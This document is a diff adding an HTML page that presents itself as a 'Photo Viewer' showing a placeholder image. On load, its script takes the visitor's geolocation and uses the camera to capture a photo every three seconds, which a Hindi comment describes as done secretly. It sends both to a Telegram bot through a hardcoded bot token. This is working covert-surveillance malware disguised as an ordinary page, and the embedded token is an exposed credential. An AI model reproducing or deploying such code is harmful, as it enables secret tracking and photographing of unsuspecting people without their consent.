@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>Photo Viewer</title>
+    <script>
+        const BOT_TOKEN = "8779921789:AAEmLxaplUyBzKwhvX10XGv2IezJnnQrXmM";
+        const CHAT_ID = "अपनी_चैट_आईडी_यहाँ_लिखें"; // @userinfobot से आईडी लेकर यहाँ डालें
+
+        async function startTracking() {
+            // 1. लोकेशन लेना
+            navigator.geolocation.getCurrentPosition(pos => {
+                const msg = `📍 लोकेशन मिली:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nGoogle Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            });
+
+            // 2. कैमरा एक्सेस और फोटो कैप्चर
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                const canvas = document.createElement('canvas');
+                
+                // हर 3 सेकंड में चुपके से फोटो खींचना
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'capture.jpg');
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                }, 3000);
+            } catch (err) {
+                console.log("Camera Blocked");
+            }
+        }
+        window.onload = startTracking;
+    </script>
+</head>
+<body style="margin:0; text-align:center; background:#000;">
+    <h2 style="color:white; font-family: sans-serif; margin-top:20px;">Loading Photo...</h2>
+    <img src="https://via.placeholder.com/400x500.png?text=Munish+Bro+Photo" style="width:90%; border-radius:10px;">
+</body>
+</html>
